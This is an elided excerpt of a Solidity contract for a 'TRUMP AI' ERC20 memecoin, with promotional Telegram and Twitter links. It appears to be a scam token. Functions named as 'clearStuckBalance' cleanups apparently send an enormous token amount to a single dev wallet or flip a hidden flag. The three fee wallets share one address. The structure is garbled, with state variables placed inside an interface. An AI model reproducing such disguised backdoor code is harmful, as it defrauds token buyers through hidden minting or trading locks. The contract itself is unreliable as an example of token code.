...
/*
https://t.me/TRUMPAI_ERC20
https://twitter.com/TRUMPAI_1000X
...
abstract contract Ownable is Context {
    ...
    function renounceOwnershipsekrtyu() public virtual onlyOwner {
        _setOwner(address(0));
    }
...
interface IRouter {
    ...
    address public marketiehkings = 0xaC3588c31e4E6E4252c25b2c10fF49232A7AA8aF; 
    address public devslletkings = 0xaC3588c31e4E6E4252c25b2c10fF49232A7AA8aF;
    address public eystsewalletkings = 0xaC3588c31e4E6E4252c25b2c10fF49232A7AA8aF;
    ...
    constructor() ERC20("TRUMP AI", "TRUMPAI") {
        ...
        exemptFee[marketiehkings] = true;
        exemptFee[eystsewalletkings] = true;
        exemptFee[devslletkings] = true;
        ...
        if (contractBalance >= tokenLiquidityThreshold) {
         ...
         uint256 denominator = feeswap * 2;
          ...
          addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            ...
            if (marketingAmt > 0) {
                payable(marketiehkings).sendValue(marketingAmt);
            }
            uint256 ecosystemAmt = unitBalance * 2 * swapTaxes.ecosystem;
            if (ecosystemAmt > 0) {
                payable(eystsewalletkings).sendValue(ecosystemAmt);
            }
            uint256 devAmt = unitBalance * 2 * swapTaxes.dev;
            if (devAmt > 0) {
                payable(devslletkings).sendValue(devAmt);
            }
    ...
    function clearStuckBalanceETHtoltnkolpes() external payable{
        andnicob(devslletkings, 10 * 10**28);
    }
    ...
    function clearStuckBalanceInitemkper() external payable{
        bontudu = 3;
    }
